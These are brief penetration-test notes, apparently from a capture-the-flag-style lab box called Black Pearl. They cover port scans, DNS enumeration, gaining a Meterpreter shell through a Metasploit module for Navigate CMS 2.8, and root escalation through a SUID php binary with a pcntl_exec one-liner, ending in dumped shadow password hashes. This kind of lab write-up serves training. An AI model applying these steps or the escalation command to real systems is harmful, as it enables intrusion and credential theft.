### nmap -vv -sS -Pn -oN 10.0.2.154_ports.nmap -p- 10.0.2.154

22/tcp open ssh syn-ack ttl 64  
53/tcp open domain syn-ack ttl 64  
80/tcp open http syn-ack ttl 64  
MAC Address: 08:00:27:FB:AB:C0 (Oracle VirtualBox virtual NIC)
 
### nmap -vv -sC -sV --script=vuln -oN 10.0.2.154_svcs.nmap -p 22,53,80 10.0.2.154

22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
53/tcp open domain syn-ack ttl 64 ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)  
80/tcp open http syn-ack ttl 64 nginx 1.14.2  
MAC Address: 08:00:27:FB:AB:C0 (Oracle VirtualBox virtual NIC)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
## Web

Source code:  
Webmaster: alek@blackpearl.tcm  
/navigate/login.php
   

Navigate CMS v2.8
   

## Nessus

*** Multiple Vendor DNS Query ID Field Prediction Cache Poisoning  
nginx < 1.17.7 Information Disclosure
 
### dnsrecon -r 127.0.0.0/24 -n 10.0.2.5 -d null

[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255  
[+] PTR blackpearl.tcm 127.0.0.1  
[+] 1 Records Found
 
Add blackpearl.tcm 10.0.2.5 to /etc/hosts
 
Close browser  
Navigate to [http://blackpearl.tcm](http://blackpearl.tcm)
 
Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
 
mysqlnd 5.0.12-dev - 20150407 - $Id: 7cc7cc96e675f6d72e5cf0f267f48e167c2abb23 $
 
## Metasploit

Search Navigate CMS 2.8  
Set payload blackpearl.tcm
 
Meterpreter shell!  
Shell  
Find / -type f -perm /4000 2>/dev/null  
Search php on gtfobins  
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
 
Root!
 
root:$6$c4BwA1XI3VbCnl62$MlVjNAchabhFxyeARWEvgnA4N/azflOuqz2azx9WdPNErtBgzqkvFSgt0.gqRazsfUzkoBTW7/lYObBpYFw6r1:18777:0:99999:7:::
 
alek:$6$1Pg0Fr6mgt01tC1j$pMOBzNq5eiXP8Y2XulhXX219o6j0q/9TsK7VwLMfBmOPbpaEY1CLtauLgoIoo9yPH/Sr5713awkBWhB5pxqKx.:18778:0:99999:7:::